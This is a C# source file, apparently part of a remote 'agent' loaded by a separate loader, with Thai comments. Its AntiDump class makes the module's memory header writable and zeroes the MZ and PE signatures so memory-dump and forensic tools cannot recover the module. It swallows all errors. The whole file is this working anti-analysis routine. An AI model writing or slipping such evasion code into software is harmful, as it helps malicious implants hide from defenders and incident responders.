using System;
using System.Runtime.InteropServices;

namespace MidnightAgent.Security
{
    public static class AntiDump
    {
        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        /// <summary>
        /// ลบ MZ และ PE Header ในหน่วยความจำเพื่อป้องกันการ Dump
        /// </summary>
        public static void StompHeader()
        {
            try
            {
                // รับ Base Address ของ DLL นี้ (Agent) ไม่ใช่ของ Loader
                IntPtr moduleBase = Marshal.GetHINSTANCE(typeof(AntiDump).Module);
                if (moduleBase == IntPtr.Zero || (long)moduleBase == -1) return;

                // ปลดล็อคสิทธิ์การเขียน
                if (VirtualProtect(moduleBase, (UIntPtr)4096, 0x04, out uint oldProtect))
                {
                    unsafe
                    {
                        byte* ptr = (byte*)moduleBase.ToPointer();

                        // 1. ลบ MZ Signature (2 bytes แรก)
                        ptr[0] = 0;
                        ptr[1] = 0;

                        // 2. หาตำแหน่ง PE Header จาก e_lfanew (Offset 0x3C)
                        int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
                        if (e_lfanew > 0 && e_lfanew < 4096)
                        {
                            byte* pePtr = ptr + e_lfanew;
                            // ลบ PE Signature (4 bytes: P, E, 0, 0)
                            pePtr[0] = 0;
                            pePtr[1] = 0;
                            pePtr[2] = 0;
                            pePtr[3] = 0;
                        }
                    }
                    
                    // คืนค่าสิทธิ์เดิม
                    VirtualProtect(moduleBase, (UIntPtr)4096, oldProtect, out _);
                }
            }
            catch { }
        }
    }
}
